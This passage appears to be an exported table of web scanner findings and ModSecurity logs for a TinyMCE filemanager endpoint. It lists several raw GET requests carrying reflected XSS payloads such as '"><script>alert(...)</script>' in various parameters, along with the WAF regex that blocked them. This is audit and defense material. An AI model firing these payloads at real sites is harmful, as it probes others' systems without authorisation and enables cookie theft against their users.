This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(161199)&lt;/script&gt;&lt;!--&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28161199%29%2F; PHPSESSID=33h35nnpgi91g0ti69iger6qj6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:44</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:42 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(161199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttLqwQAW0AABvT@HUAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttLqwQAW0AABvT@HUAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366935</td><td class=xl24 width=64 >2015-03-31 22:59:20</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&lt;script&gt;prompt(111599)&lt;/script/&gt;&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=pgp2jubm7qqu1bf86t859u4663
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:45</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:44 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(111599)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttMKwQAW0AAHhB770AAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttMKwQAW0AAHhB770AAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366936</td><td class=xl24 width=64 >2015-03-31 23:00:48</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=&quot;&gt;&lt;script&gt;alert(350299)&lt;/script&gt;&lt;!--&amp;fldr=test/&amp;551ac2f761bb8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=54kj14b11mvhtd8pr076avrkf3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:46</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:45 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(350299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttMawQAW0AAD9hYOUAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttMawQAW0AAD9hYOUAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366937</td><td class=xl24 width=64 >2015-03-31 23:02:32</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >551ac2f5a7697</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697=&quot;&gt;&lt;script&gt;alert(307099)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=86opbjikijkj8o0rejq2ib8871
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:47</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:46 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:551ac2f5a7697. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(307099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttMqwQAW0AABt@bWQAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttMqwQAW0AABt@bWQAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366938</td><td class=xl24 width=64 >2015-03-31 23:03:35</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(431199)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=g8uosgh4ca0mpb2ummt33rl2d3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:49</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:47 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(431199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttM6wQAW0AAHchlVwAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttM6wQAW0AAHchlVwAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366939</td><td class=xl24 width=64 >2015-03-31 23:04:33</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(207899)&lt;/script&gt;&lt;!--&amp;551ac2f761bb8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28207899%29%2F; PHPSESSID=eoi3o33r95jj662bn6ef4ko9p7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:50</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:49 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(207899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttNawQAW0AAHgzv04AAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttNawQAW0AAHgzv04AAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366940</td><td class=xl24 width=64 >2015-03-31 23:07:01</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(770199)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=obgn7lecpmrth0clnqf3ontqo4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:51</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:50 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(770199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttNqwQAW0AAB7zKNsAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttNqwQAW0AAB7zKNsAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366941</td><td class=xl24 width=64 >2015-03-31 23:07:58</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


